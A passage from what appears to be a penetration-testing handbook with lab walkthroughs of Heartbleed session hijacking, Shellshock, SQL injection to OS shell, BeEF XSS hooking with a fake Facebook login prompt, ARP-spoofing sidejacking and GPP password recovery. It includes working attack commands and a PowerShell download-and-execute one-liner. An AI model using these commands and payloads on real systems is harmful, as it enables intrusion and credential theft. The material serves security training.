vulnerability was after-hours? Whose account might you compromise? In the case of Heartbleed, as many IT administrators VPN’ed in during the rush to patch systems, they could have been getting compromised at the same time. Let’s take a look at the Juniper SSL VPNs that were vulnerable to this bug. Running the same command as before, we query the SSL VPN web server to return what is stored in the designated memory space. A result would look like the following: Heartbleed - SSL VPN In this case, the client even had two-factor authentication, but remember how two-factor works with SSL VPNs. Once you authenticate with both username/password and token (second factor), you get back a web session ID. If you capture just the web session ID, you can impersonate this user now"},{"pageNumber":113,"pageContent":"(without the second factor) by taking their session ID and importing it into your own browser. For example, we see in the heartbleed memory dump a cookie called DSID. What is the DSID? “The SA issues an HTTP cookie to authenticate a user session ( DSID ), which is shared by client components (that is, NC/WSAM/Pulse) and the browser. Generally, browsers do not store cookies in any secure manner; so it is relatively easy for an attacker to obtain the DSID cookie and gain access to an SA session.”{7} This is the user’s session cookie! If we grab this cookie and create this cookie in our browser, we become this user. So let’s open up Firefox, access the VPN server, select Cookies from the Web Developer tab, and view Cookie Information.

Just add it in with the DSID value you obtained from the Heartbleed bug and reload that page.

Shellshock Shellshock was the second huge vulnerability in 2014 that caused a multitude of systems to get infected all over the Internet.{8} Shellshock was a vulnerability that allowed remote code execution due to the fact that Bash has rules for handling the string “() { :; };”. The vulnerability relied on how the system would parse environment strings. Although this didn’t solely affect CGI, due to the fact that Bash can parse CGI scripts, this vulnerability is easily attackable. The first part of the exploit string, which is really just an environment variable function definition followed by a semi-colon, is written as “() { :; };”. Regardless of what the function definition contains, all we care about is the value we inject after the trailing semicolon, which will be parsed and executed by vulnerable versions of Bash. Shellshock Lab This sounds complex, but the best way to demonstrate shellshock is through an example. This will give you a good understanding of how it works. The OWASPBWA vulnerable web application virtual machine is vulnerable to the Bash exploit, so make sure you have it running. Log into that VM image and copy the vulnerable cgi file listed below first. On the OWASPBWA VM Image from a Terminal:"},{"pageNumber":115,"pageContent":"● wget --no-check-certificate https://raw.githubusercontent.com/cheetz/icmpshock/master/test.cgi -O /usr/lib/cgi- bin/test.cgi ● chmod +x /usr/lib/cgi-bin/test.cgi ● Find the IP of the vulnerable host (ifconfig) This will write a shell script to the cgi-bin folder that we need to use to execute the vulnerability. Remember for something like Shellshock to work, it needs to have a bash file in the cgi-bin folder. You can access it by going to a browser and inputting http://[IP of vulnerable host]/cgi-bin/test.cgi. If everything worked, you should see a page that just says “hi”. Going back to our attacking Kali host, we are going to use a tool I created called icmpshock.py (note that there is also a Metasploit module, so try them all). The reason I created this script is because I wanted the tool to brute-force through all common cgi type files at an amazing speed and test all the common HTTP header information (User Agent, Cookie, Host, Refer) with ShellShock. As long as you have a pretty big pipe, you can take advantage of Python’s threading to brute-force through all cgi files/directories in just seconds. Remember that we are going for quick and efficient to try to pop as many boxes as possible. Now, we go back to our attacking VM host, which you have already configured at the beginning of the book, and go to: ● cd /opt/icmpshock/ ● chmod +x icmpshock.py ● gedit target_list.txt and add the vulnerable server's IP ● Start Up tcpdump to listen for ICMP in a new terminal window. ○ tcpdump -nni eth0 -e icmp[icmptype] == 8 ● ./icmpshock.py [Listener IP of the Kali Host] target_list.txt This script will brute-force through many different common cgi paths and filenames. If it successfully identifies a file and that file is a shell script, it will inject the shell shock exploit to force the system to ping back to our victim host. This shows that the victim is not only vulnerable, but that we also have command execution. This is why we set tcpdump to listen to ICMP requests. In the example below, the icmpshock.py script is going through its list of cgi location/files and when it hits cgi-bin/test.cgi, it causes the victim host to ping our attacker box.

Let’s uncomment the code with the bin/nc command and comment the original ping comment.

Different examples of these tools are Git, Bazaar, Mercurial and Subversion, but they all work relatively the same. A common mistake seen throughout many development environments is that developers tend to leave their repositories (repo) publicly accessible.{9}{10} As a penetration tester, once a repository is identified via a web scanner, the common techniques is to clone the repository, look for sensitive information in different commits, and restore older versions of the applications. As seen in our next example, Git repositories are usually found in a .git directory (example: 10.10.10.10/.git/).

The first command to run is a status command. A status command shows you the status of files in the index versus the working directory and can be run by: ● git status Git - Deleted Files In the status output, we see that in the local revision, secret.php was deleted.

As more and more companies start to run vulnerability scans of their own, I have slowly (slowly) been seeing a trend of the low-hanging service-based vulnerabilities going away (like MS08-067). Therefore, the shift to application-based vulnerabilities are still an easy target to exploit since most vulnerability scanners either do not provide web application testing or do not enable web application scanning because it may break applications or take way too long to scan. As this book is geared more toward Red Teaming concepts, this book does not go in depth on all the different vulnerabilities and how to manually exploit them. This is because a manual web application book needs to be very detailed and discuss all the more obscure attacks like CORS (Cross-Origin Resource Sharing), SSRF (Server-Side Request Forgery), the various one-off OAuth issues that come with misconfiguration of security controls, and others. If you are looking for more information on testing all sorts of web type vulnerabilities, you should heavily use these three resources: ● OWASP Testing Guide ○ http://bit.ly/19GkG5R ○ https://www.owasp.org/images/1/19/OTGv4.pdf ● SANS - Securing Web Application Technologies ○ https://www.sans.org/security-resources/posters/securing-web- application-technologies-swat-2014-60/download ● The Web Application Hacker's Handbook: Finding and Exploiting Security Flaws ○ http://amzn.to/1lxZaCv Lastly, if you read about Printer Exploitation in The Drive section, that is a great example of how a web configuration vulnerability can get you to DA (or at least a domain account).

POST Parameter Example POST examples are going to mimic GET injections, except for how the vulnerable parameter is passed. Instead of being in the URL, the POST parameters are passed in the data section. This is normally seen with username and passwords since the web servers generally log GET parameters and you wouldn't want the web server to log passwords. Also, there are size limitations with GET methods and, therefore, a lot of data will be passed via POST parameters for larger applications. Determining if an SQL inject is valid (the result will be the banner if valid): ● python ./sqlmap.py -u \"http://site.com/info.php \" --data= \"user=test&pass=test\" -b For example, we will attack our vulnerable virtual machine (OWASPBWA): ● python ./sqlmap.py -u \"http://192.168.1.124/mutillidae/index.php?page=user- info.php&username=asdf&password=asdf&user-info-php-submit- button=View+Account+Details\" -b "},{"pageNumber":135,"pageContent":"SQLMap Banner Retrieving the database username: ● python ./sqlmap.py -u \"http://site.com/info.php --data= \"user=test&pass=test\" -- current-user Interactive Shell: ● python ./sqlmap.py u \"http://site.com/info.php --data= \"user=test&pass=test\" --os- shell If you are able to gain access to an os-shell, you will have full command line access as the database user.

If SQLmap fails, it might be your configuration, so make sure you try using the Wizard setup, also. Sqlninja (http://sqlninja.sourceforge.net/) (Kali Linux) Sqlninja is another great SQL injection tool for uploading shells and evading network IDS systems against MSSQL databases. You might be asking: Why would I use Sqlninja if I have already become comfortable with SQLmap? From many years of experience, I have seen a large number of tests that identify SQLi with only one tool or the other. This might be due to a number of factors such as how it detects blind SQLi, how they upload binaries, how IPS signatures might detect one tool or the other, or how they handle cookies. There are so many different variables, and it would be smart to always double-check your work. Taking a look at the help file with the -h switch, we can see all the different functionality Sqlninja has: Sqlninja Help Page The only issue I have had with Sqlninja is that the configuration file is a bit more difficult to set up and I have never found great or easy-to-read documentation. So I will give two similar examples from SQLmap. "},{"pageNumber":137,"pageContent":"In Sqlninja, you need to define the vulnerable variable to inject by using the __SQL2INJECT__ command. This is different from SQLmap, where we did not need to specify which field to test against. Let's go through a couple of examples since it should make things much clearer. Before we can use Sqlninja, we need to define the SQL configuration file. This will contain all the information about the URL, the type of HTTP method, session cookies, and browser agents. Let me show you the easiest way to obtain the information required for Sqlninja. As before, load up the Burp Suite and turn the proxy intercept on the request where the vulnerable field is passed. In the following example, we are going to capture requests sent to /wfLogin.aspx and identify the POST parameter values. This is going to have most of the information required for Sqlninja injections, but slight modifications will need to be made from the Burp Raw request. Let's take a look at one of the requests from Burp that identified a potential SQLi vulnerability: Burp Request Example In the next two examples, you will see how the most common GET and POST parameters are created. This can be used for any different type of HTTP method, but usually the POST and GET methods will be used. A few things to notice from the original Burp request versus how it will be entered in the Sqlninja configuration file are: ● The HTTP Method (GET/POST) needs to be modified to include the full URL. Burp is missing the http://site.com in front of /wfLogin.aspx ● You have to define which parameters to fuzz by adding the __SQL2INJECT__ string. ● Sometimes for Sqlninja, you may need to try the attack by first closing the vulnerable SQL parameter. This can be done with ticks, quotes, or semi-colons. GET Parameter Example We are going to write the sql_get.conf configuration file to our Kali desktop with two vulnerable parameters. Sqlninja will try to attack both the user and pass fields and try to validate if they are"},{"pageNumber":138,"pageContent":"vulnerable.

In a terminal, we need to create the configuration file and modify the parameters to inject into. In this example, we will inject into both the username and password: ● gedit ~/Desktop/sql_post.conf ● Enter the following into the configuration file and save it: ● --httprequest_start-- POST http://site.com/wflogin.aspx HTTP/1.0 Host: site.com User-Agent: Mozilla/5.0 (X11; U; en-US; rv:1.7.13) Gecko/20060418 Firefox/1.0.8 Accept: text/xml, application/xml, text/html; q=0.9, text/plain; q=0.8, image/png, */* Accept-Language: en-us, en; q=0.7, it;q=0.3 Accept-Charset: ISO-8859-15, utf-8; q=0.7,*;q=0.7 Content-Type: application/x-www-form-urlencoded Cookie: ASPSESSIONID=3dkDjb3jasfwefJGd Connection: close username=test';__SQL2INJECT__&password=test';__SQL2INJECT__ --httprequest_end-- Executing Sqlninja Whether you use a GET or POST method attack, executing your attack will be the same. Now that we have created a configuration file, we can use the following command to run Sqlninja: ● sqlninja -mt -f ~/Desktop/sql_get.conf The following command says to run Sqlninja using the test mode to see if the injection works with the configuration file we just created. If you are lucky and do find a valid SQL injection, you can start to attack the database.

"},{"pageNumber":140,"pageContent":"Sqlninja Example Once we have xp_cmdshell available, we want to test that we have command line access and what types of privileges we have. In the example below we are exploiting the SQLi vulnerability and testing command line commands. During this specific test (image below), it looks like we might be running commands on the server, but we would need to validate this. The issue though, is that after setting up a listener on a server we own on the Internet, it doesn't look like we are seeing any connections from the compromised server outbound. This could be a problem if we wanted to exfiltrate data back to us or download additional malware. Since the command line console created by Sqlninja doesn't show the responses from commands, therefore, we need to validate that our commands are successfully executing. The best way to check if a command is working is by putting tcpdump to listen for pings on a server we own, which is publicly available on the Internet. By running ping commands on a compromised server, we can easily validate if our server is responding to pings. The reason we use pings is because ICMP is generally allowed outbound and is less likely to trigger IDS/IPS signatures. This can be configured with the following command on an external server owned by the attacker: ● tcpdump -nnvXSs 0 -c2 icmp This command will log any pings sent to my server, which will allow me to validate that the server can talk outbound and that my commands are working. On my compromised SQLi host, I execute a simple ping back to my server. If it is successful, tcpdump will see the ICMP request. Command line SQLi attacks can be run with the following command: ● sqlninja -f [configuration_file] -m c As we can see in the image below, I first tried to run telnet commands back to my server, but that was unsuccessful. I then tried to initiate ping commands back to my server, where tcpdump was listening. In this case, my attack was successful, which proved I could run full commands on this host, but it does not have web access back out. In the image below, the top portion is my server logging pings and the bottom image is the victim host, which is vulnerable to SQLi.

This should give you enough details to help you start testing and practicing on vulnerable frameworks. Of course, these are the best scenario options, where the SQLi works without having to configure detailed settings about the database type, blind SQLi type, or other timing type issues. NoSQL Database Injections More and more, I am coming across NoSQL type databases on my penetration tests. If you aren’t familiar with NoSQL, try to build out a database and interact with it. The major difference between the two types of databases is that in a regular SQL database, it is structured and relational, while in a NoSQL database, it is based more on key/value pairs, allowing you to store any type of data. This is a very high explanation and takes a little time to understand why NoSQL databases are more beneficial compared to traditional relational databases."},{"pageNumber":142,"pageContent":" The two common types of NoSQL databases I come across are CouchDB and MongoDB.

CMS - Content Management Systems To continue on the topic of vulnerable web applications, I am always finding different types of content management systems (CMS) through my penetration tests. From what I have seen, Nessus will pick up some of the CMS issues, but most are found through more manual testing. To help speed up the initial scans of CMS sites, I like to use a couple of tools, listed below. CMSmap Lab ( https://github.com/Dionach/CMSmap )(Kali Linux): CMSmap is a vulnerability scanner written by Dionach and automates and validates issues in numerous CMS applications. Let’s walk through an example from initial finding to exploitation. On our OWASPBWA VM, there is a WordPress site on which we can test the scanner: http://[Vulnerable OWASPBWA IP]/wordpress/.

Cross-Site Scripting (XSS) I can't talk about web application vulnerabilities without talking about Cross-Site Scripting (XSS). This is probably one of the most common vulnerabilities that I come across. XSS is a user attack that is caused by a lack of input validation by the application. There are two types of XSS: reflective (non-persistent) and stored (persistent). Both allow an attacker to write script code into a user's browsers. I am going to focus on reflective XSS, which is the more common type and is relatively similar to stored XSS in terms of vulnerability exploitation. BeEF Exploitation Framework ( http://beefproject.com/ )(Kali Linux) The general question I get from my clients is, \"How much harm can an XSS really cause?\" With this vulnerability you have the full ability to write scripting code on the end user's browser, so anything that you do in JavaScript could be used against the victim. In this section, we will dive into how malicious you can be with an XSS attack."},{"pageNumber":150,"pageContent":" The best tool I have seen used with XSS attacks is the BeEF Exploitation Framework. If you find an XSS, not only can you cause a victim to become part of your pseudo-botnet, but you can also steal the contents of the copy memory, redirect them to links, turn on their camera, and so much more. If you do find a valid XSS on a site, you will need to craft your XSS findings to utilize the BeEF Framework. For our XSS examples in this chapter, we are going to use an XSS that was identified from our initial Burp Active Scans. Let's take the example vulnerable URL: http://www.securepla.net/xss_example/example.php?alert=test'<script>[iframe]</script>. From the Setting Up a Penetration Box section, we installed BeEF into /opt/beef/. We are going to have to first start the BeEF service. Starting BeEF Commands: ● cd /opt/beef/ ● ./beef Starting Up BeEF Let's log into the console UI after the BeEF server has started. As we see from the image above, the UI URL in this case is located at http://127.0.0.1:3000/ui/authentication. We can open a browser and go to that URL. "},{"pageNumber":151,"pageContent":"BeEF Login Screen If everything started up successfully, you will be able to log into the UI using the username “beef” and password “beef”. If we look at the image where we loaded BeEF via the command line, we see a URL for both the UI page and the hook page (Hook URL). Let's take a moment to review the hook page (hook.js). BeEF Client Side JavaScript Although this JavaScript has been well obfuscated, this is the payload that will control the victim user and will be injected into the victim browser's page. Once injected, their browser will connect back into your central server with the victim unaware. LAB - XSS on OWASPBWA We were able to identify an XSS via Burp or ZAP on our vulnerable Web Application VM (OWASPBWA). So, we can directly access the vulnerable XSS by connecting to our web service: ● [IP_of_OWASPBWA]/owaspbricks/content-2/index.php? user=harry3a201<script>alert(1)<%2fscript>6f350 Since we have located an XSS vulnerability on a page, we can now use BeEF to help with the"},{"pageNumber":152,"pageContent":"exploitation of the end user. In our initial example, http://[IP_of_OWASPBWA]/owaspbricks/content-2/index.php?user=, the user variable takes any input and presents it to the end user. This proves that the end user does process the JavaScript code embedded from our query. Bricks - XSS To create a successful exploit, instead of printing an alert, we are going to craft a URL that uses JavaScript to include the hook.js file. It will look something like: ● http://192.168.1.124/owaspbricks/content-2/index.php?user=harry3a201<script src=http://192.168.1.123:3000/hook.js></script> I was able to append the hook.js script by using the JavaScript code: ● <script src=[URL with hook.js]></script> Remember that if this is done on a public site, then the URL will need to point to a public address that hosts the hook.js page and listening service. Once you trick a victim into going to that URL using Social Engineering Tactics, they will become a part of your XSS zombie network. Going back to our UI panel, we should now see that a victim has joined our server.

Drop down to the Social Engineering folder, select Pretty Theft, then configure it how you want in this case, we will use the Facebook example, and hit execute. Remember that the IP for the custom logo field has to be your BeEF IP. This will allow the victim to grab the image from your server. Pretty Theft Facebook Attack After the attack is submitted, a Facebook password prompt will pop up onto the victim's system. This is where you can get creative by using a popup in which your target users would most likely enter their information. If you are looking to gain Google accounts, there is also a Google Phishing module."},{"pageNumber":154,"pageContent":"The benefit of this client-side attack is that the ordinary-looking password prompt popup keeps the user unaware that they are part of this zombie network. Pretty Theft Attack After the unsuspecting victim types in their password, go back to the UI to find your loot. Clicking on the ID “0” will show the attacker what the victim typed into that box. This should be enough to start gaining some access as the user, allowing you to move laterally through the environment. Pretty Theft Results I hope I was able to demonstrate how powerful an XSS vulnerability can be. It is exponentially worse if the XSS finding was a stored XSS versus the reflective XSS example we just saw. If it had been a stored XSS, we most likely wouldn't even need to use social engineering tactics on the victim to go to the link; we would just need to wait until our code was executed by the victim’s system. Cross-Site Scripting Obfuscation : A common problem for an attacker injection code is that the application implements some sort of input validation for vulnerable XSS fields. This means the XSS is still valid, but you don't have all the normal characters you need to successfully take advantage of this vulnerability. However, the great thing for a pentester is that these filters are usually improperly configured. Fortunately, since there are so many different types of ways to encode your XSS attacks, the filters from the input validation scripts usually fail. You really could write an entire book about how to craft different XSS attacks, but here are my quick and dirty tricks to get a working list of encoders."},{"pageNumber":155,"pageContent":" Crowd Sourcing One of my favorite methods to find a huge number of valid XSS vulnerabilities is to visit http://www.reddit.com/r/xss. People will post the different XSS findings they have come across on that sub-reddit. This is a great way to see what other types of XSS vulnerabilities people are finding. Scanners are good, however, they can never replace a human eye. A lot of the findings on this sub- reddit were not found by an automated process, but found manually. I created a quick script to grab and parse all the results from the crowd-sourced sub-reddit. To kick off your own scan: ● cd /opt/reddit_xss/ ● python reddit_xss.py Reddit XSS Scrape Once competed, a file named output_xss.txt will be generated. As you will see in your output, people will obfuscate XSS attacks with “from CharCode”, percent encoding, htmlentities, and other JavaScript commands. Now, you are armed with a good list of XSS examples (many of them still active) and encodings. One quick additional note is that I do not recommend you visit the vulnerable site with the XSS payloads, as you could be seen as attacking their website. What I wanted to do was show you how to generate a good list of encoding examples that might help you in your attacks. OWASP Cheat Sheet Another resource I often use is the OWASP Evasion Cheat Sheet. This is usually the first place I look whenever I run into an encoding problem on any of my engagements. The cheat sheet can be found here: https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet . The most common XSS problems I find usually arise from length issues or the fact that the greater/less than symbols are not allowed. Luckily, the OWASP has many different examples to get around these issues. "},{"pageNumber":156,"pageContent":"Cross-Site Request Forgery (CSRF) Cross-Site Request Forgery basically allows you to force an unwanted action onto the victim. For example, you send a link to someone who is currently logged into their bank account. When that person accesses your link, it automatically transfers money out of their account into your account. This happens when there is no verification process to check that the user went through the appropriate steps to transfer money. What I mean is that in order to transfer money, a user needs to login, go to their transfer payment page, select the recipient and then transfer the money. When these appropriate steps are taken, a CSRF token is generated on each and every page as you progress through the application. Additionally the previous token is verified before the next step can process. You can think of this as a tracking system– if any of those tokens are empty or wrong, the transaction does not process. There are many complex ways to test this, but the easiest way to manually run these tests is through proxying traffic. I will go through the process of making a transaction as described above and see if I can replay it. However, in the replay, my goal is to get the same end result without having to go through all of the steps, which proves that there is a CSRF vulnerability. Using Burp for CSRF Replay Attacks Let's take an example where a bank application allows transfers from one user to another. In the URL below, there are two parameters that are used. The first parameter is User (to whom the money will go). The second parameter is the dollar amount. In the case below, we successfully transferred money to Frank. What would happen if I sent this same URL to another person who was already logged into the same bank application? Well, if a CSRF protection were not in place, it would transfer $123.44 from the victim host to Frank, instantly. CSRF Example To test if this is possible, we first capture the request via Burp. Make sure that your browser is still proxying to Burp and make the request with user 1. This should work just fine as you went through the proper channels to make the transfer. You should be able to log in, go to the transfer page, fill in the information, and submit. In the example below, we can go to Burp's Proxy Tab and the History to see our last requests. At the"},{"pageNumber":157,"pageContent":"very bottom, we see the request for the bank transfer. We also see that there is a hook cookie, but nothing that looks like a CSRF token.

"},{"pageNumber":159,"pageContent":"Executing Burp Repeater The application shouldn't have allowed the user to transfer money again without going through all the steps required to create a transfer request.

Session Tokens Session tokens are generally used for tracking sessions, as HTTP is a stateless protocol by default. What you want to look for in a session token are: (1) the fact that they cannot be guessed and, (2) that they properly track a user. Other things you should look for are when session tokens expire, if they are secure, that they validate input, and that they are properly utilized. In this section, we are going to specifically look at making sure session tokens are properly randomized and that they can't be guessed. Using Burp Suite to capture an authentication process, we can see in the response that there is a set-cookie value for the session tokens. This is located under the main Proxy tab and sub-tab History ."},{"pageNumber":160,"pageContent":" Burp's Raw Response We can right-click within the raw response section and send this request to the Sequencer feature.

There are many other features within Burp's sequencer tool, so I recommend spending some time trying to understand how session tokens are generated. "},{"pageNumber":162,"pageContent":"Character Position for Cookies I leave a lot here to your own judgment because it takes experience to understand when session cookies are or aren't secure. Every major web application I have seen uses different types of implementations and algorithms to generate session tokens, so running something like the examples above or reviewing source code may be required. Additional Fuzzing/Input Validation Burp Suite is extremely extensible and has a lot of other features. One quick feature that I find extremely helpful during manual testing is the Intruder function. In the Intruder function, you have the ability to tamper with any part of the request and provide your own data. This would be very useful if you want to supply your own fuzzer input to test a variable. We are going to walk through a very high-level overview of how you could use the fuzzing feature. The basic idea of the following example is to access an online store and see why parameter fuzzing can be highly beneficial. The online store might only link to certain items from their website, but the content managers could have put up all of next week's sale items. They just wait for the next week and"},{"pageNumber":163,"pageContent":"link the content from their main website homepage. I used to see a lot of these types of issues for sites that do Black Friday sales. They will have all of their content and prices hosted, but not linked anywhere on their page or made available to the public.

I created a dummy website to demonstrate this exact issue. The website: www.securepla.net/tehc/hack.php?id=2 , has a GET parameter called ID. You can modify this ID field from 1 to 2 to 3 and get different results. Brute Forcing Parameters We want to brute-force through all the different parameter values to see which pages exist and which pages do not.

If we look at the sample test above, the parameter values we injected from 5 to 26, resulted in a page content length of 299. This source length of 299 is now our baseline for testing. When we go through all of the responses of all pages that are not 299 in length, we see that request 27 has a page length of 315, which gives us the password: “dont hack me” (image above).

A lateral pass play is used when you can’t seem to move forward. You might be on a network, but without privileges or account credentials, you would normally be stuck on a box. As a tester, you begin to distinguish yourself from the rest by your ability to move through the network and gain access to domain administrative accounts. However, as a penetration tester this shouldn’t be your only goal. It is also important to be able to identify where sensitive data is being stored and gain access to those environments. This might require pivoting through essential employees and understanding how the corporation segments their data. This section will focus on moving through the network and going from a limited user, all the way to owning the whole network. We will cover such topics as starting without credentials, proxying through hosts, having limited domain credentials, and then having local/domain credentials. On The Network Without Credentials: Let's say that you are on the network, but you don't have any credentials yet. Maybe you cracked their WPAv2 Personal Wi-Fi password or popped a box that wasn't connected to the domain. I might first turn on tcpdump to listen passively, identify the network, find the domain controllers, and use other passive types attacks. Once I feel like I have an understanding of the local network, I will start compromising systems using a variety of attacks specified in the next few sections. Responder.py ( https://github.com/SpiderLabs/Responder ) (Kali Linux) One tool that has helped me in gaining my first set of credentials is called responder.py. Responder is a tool that listens and responds to LLMNR (Link Local Multicast Name Resolution) and NBT-NS (NetBIOS over TCP/IP Name Service). Responder also actively takes advantage of the WPAD vulnerability.

"},{"pageNumber":173,"pageContent":"Automatically Detect Settings As the attacker, since we are on the same network as our victim, we can respond to Name Resolutions and inject our own PAC file to proxy all web traffic. This way we can force the user to authenticate against our SMB servers.

Sometimes it is not worth trying to crack a password. If you know the victim has a complex password policy or there aren't enough users online to get multiple hashes, you might want to try SMB replay attacks. Instead of enabling the SMB server in Responder, you can enable Metasploit's smb_replay module (use exploit/windows/smb/smb_replay) if the victim allows NTLMv1 authentication. This now means that any SMB requests will be forwarded to a server of your choice and their challenge hashes will be authenticated against that server. Let's say you are able to do this against an IT admin, chances are they will have escalated privileges on the servers you identified. If you do have to go this route, I would recommend you watch this video by Rob Fuller: https://www.youtube.com/watch?v=05W5tUG7z2M . Fuller talks about using ZachAttack to help manage all the NTLM sessions and to continually compromise the network. However, if the end users or servers are configured in a way that only allows NTLMv2 connections, these tools will fail. The only way I have been successful in SMB Replay attacks for NTLMv2 authentication is by using the Impact framework. You can download a copy here: http://code.google.com/p/impacket/ I originally found the configuration of Impacket from: http://pen-testing.sans.org/blog/pen- testing/2013/04/25/smb-relay-demystified-and-ntlmv2-pwnage-with-python, which goes over the entire setup .

There are times when I will do one, but be aware that there is generally a good chance that you will affect end users and possibly cause disruptions on the network. So make sure you have a great grasp on ARP Spoofing before performing them on an engagement. For those that haven’t had too much experience with ARP Poisoning, let’s review what it does. ARP Poisoning is a common Man in the Middle (MITM) attack that takes advantage of the insecure nature of ARP, specifically the transition from OSI layer 2 (MAC address) to OSI layer 3 (IP address). Basically, in a simple scenario, there is a network with a router (ROUTE_A), a legitimate host (HOST_A), and an attacker (HOST_B). To poison these hosts, the attacker sends an unsolicited ARP reply to the ROUTE_A with the IP address of HOST_A, but with their own HOST_B MAC address. Then, the attacker sends an unsolicited ARP reply to HOST_A with the IP address of ROUTE_A, but again with their own HOST_B MAC address. At this point, the router now thinks the attacker’s MAC address belongs to HOST_A, and HOST_A thinks the attacker’s MAC address belongs to ROUTE_A. Ultimately, this will route all of HOST_A’s traffic through HOST_B before going to the router, bidirectionally. This could lead to manipulation of traffic, sniffing for passwords/cookies/kerberos keys, and more. If you want to see why ARP spoofing works, you can read more about it from: http://www.irongeek.com/i.php?page=security/arpspoof .

Let's see some examples which take advantage of these attacks. SideJacking: From a high-level view, sidejacking is the process of sniffing the traffic, looking for session tokens (cookies), and using those tokens to authenticate as the user. Remember that HTTP is a stateless protocol. That means it has to use other methods to track your session without a username/password authentication for every page on a web application. After you authenticate the first time, a session token will be generated for the whole session and now the token is essentially your authentication pass. If that session cookie is compromised, an attacker can take those session tokens, import them into their own browser and become you. If you are still unfamiliar with sidejacking, you can visit this link for more information: http://www.pcworld.com/article/209333/how_to_hijack_facebook_using_firesheep.html . Hamster/Ferret (Kali Linux) Hamster is a tool that allows for these sidejacking attacks. It acts as a proxy server which replaces your cookies with session cookies stolen from somebody else, allowing you to hijack their sessions. Cookies are sniffed using the Ferret program. How to run Hamster/Ferret: ● First, we enable IP forwarding: ○ echo \"1\" > /proc/sys/net/ipv4/ip_forward ● We then modify IP tables for SSL Strip: ○ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 1000 ● Next, we configure and run SSL Strip: ○ sslstrip -f -a -k -l 1000 -w /root/out.txt & ● Next, we need to enable ARP spoof (remember this will ARP spoof everyone on the network): ○ arpspoof -i eth0 [gateway] ● Next, we need to enable Ferret. In a new terminal window: ○ ferret -i eth0 ● And finally enable Hamster. In a new terminal window: ○ hamster Now, you just need to wait for a victim to go to a website, authenticate or be authenticated, and for their cookies to be sniffed. Once you feel you have obtained their cookies, look at the hamster.txt file that was created.

In your browser window, it presents a framed page where you can click on a user you captured and become that user instantly. You don't have to add any of your own cookies manually, but it only works for a limited number of sites. The originating problem is that when session cookies do not have the Secure Flag set and protocol is not over HTTPS, then there is a possibility that the cookies will be passed in clear.

DNS Redirection: If I have a successful MITM within a corporation, one attack that is usually fruitful is to clone the intranet page (or any page that requires authentication), then use it for DNS redirection. This is an easy way to get usernames and passwords. Let's see a quick example: We already know how to configure Cain and Abel to MITM systems in a network from a prior example. We will assume you already have a victim routing through you. The next step is to modify and spoof DNS requests that happen through the MITM. Under the Sniffer top tab and APR bottom tab, click on APR-DNS. Here you can right-click and add DNS requests that you want to modify.

Group Policy Preferences vulnerabilities have been patched in the newest Windows version, but it should be one of the first things to check. Group Policy Preferences is a powerful feature to make a sysadmin’s life much easier by deploying GPO settings within the whole environment. One of the features is that you can create/update local admin accounts to all the hosts within the domain. Why would someone use this feature? It might be because they want to push a new administrative local user onto every host or update the password for a local account on every machine (more common than you might think). Once this setting is configured and GPOs are updated, all workstations will now have this account. The problem is that this information (username/password of local admin account) has to be stored somewhere and in GPP’s case they are stored on the domain and readable by any AD user account. Even worse was that the encrypted AES key protecting these passwords was posted on Microsoft’s site, allowing anyone to reverse the passwords.{13}"},{"pageNumber":198,"pageContent":" If you are on a host that is authenticated to the network with any domain user, you can use the Metasploit modules with the following: ● use post/windows/gather/credentials/gpp ● set SESSION [Session # of your shell] ● exploit This would get you a lot of easy cheap local administrative credentials, but after the Windows patch, I don’t see this as often. ● https://github.com/rapid7/metasploit- framework/blob/master/modules/post/windows/gather/credentials/gpp.rb ● https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Get- GPPPassword.ps1 Or if you don’t have a shell, just mount: \\\\[Domain Controller]\\SYSVOL\\[Domain]\\Policies, look for the Groups.xml file, and decrypt the hash using: http://esec-pentest.sogeti.com/public/files/gpprefdecrypt.py .

In addition to those guides, I wanted to integrate how incident response techniques can support penetration testers. Yelp created a tool called OSXCollector, which is a forensic evidence collection and analysis toolkit for OS X. This tool is used to speed up incidents and investigations on compromised Macs. As a penetration tester, we can use these same tools to perform our information gathering automation.

Without being an administrative user on a host, you are limited in pulling hashes, installing software, changing firewall rules, modifying the registry and more. I have dedicated a quick section for getting from a regular user to a local administrator in this Zero to Hero section. Zero to Hero - Windows: After the initial compromise, one of the biggest issues is moving from a regular user to an administrative user. With a regular user, you lack the ability to make modifications to the registry, install software, bypassUAC, pull hashes, and most of all become system. In the prior chapter, we talked about looking at open shares for password lists or for configuration files. In this section, we will discuss how to look for vulnerabilities and issues on the host system to get to system. As a member of the users group with no administrative privileges, we need to look for"},{"pageNumber":200,"pageContent":"misconfigurations. What are the things we might look for? Option 1: The first common privilege escalation I see are services files that have misconfigured privileges. We know that services files execute at bootup and call an executable to run in the background. For example, think of Java updater. This runs every time you boot up and checks Oracle to see if you have the latest version of Java. It is always running and generally running at a privileged local account. This means if an executable that is called by a service is writeable by a limited user, we can replace it with a file we created, which will allow our new file to execute as system every time the service starts. Luckily for us, harmj0y created a tool called PowerUp to look for these issues: ( https://github.com/Veil-Framework/PowerTools/tree/master/PowerUp ). To run PowerUp, we will use the standard PowerShell command to download and execute the Invoke-Allchecks: ● powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks "},{"pageNumber":201,"pageContent":"PowerUp Example We see that the service omniserv is vulnerable to the Write-ServiceEXE issue.

For example, running icacls on this file, we would see an output of: ● icacls \"C:\\Program Files\\Fingerprint Manager Pro\\OmniServ.exe\" C:\\Program Files\\Fingerprint Manager Pro\\OmniServ.exe Everyone:(I)(F) NT AUTHORITY\\SYSTEM:(I)(F) BUILTIN\\Administrators:(I)(F) BUILTIN\\Users:(I)(RX) laptop\\testaccount:(I)(F) APPLICATION PACKAGE AUTHORITY\\ALL APPLICATION PACKAGES:(I)(RX) For this file, we can see that Everyone has (F) or full access to modify this executable.

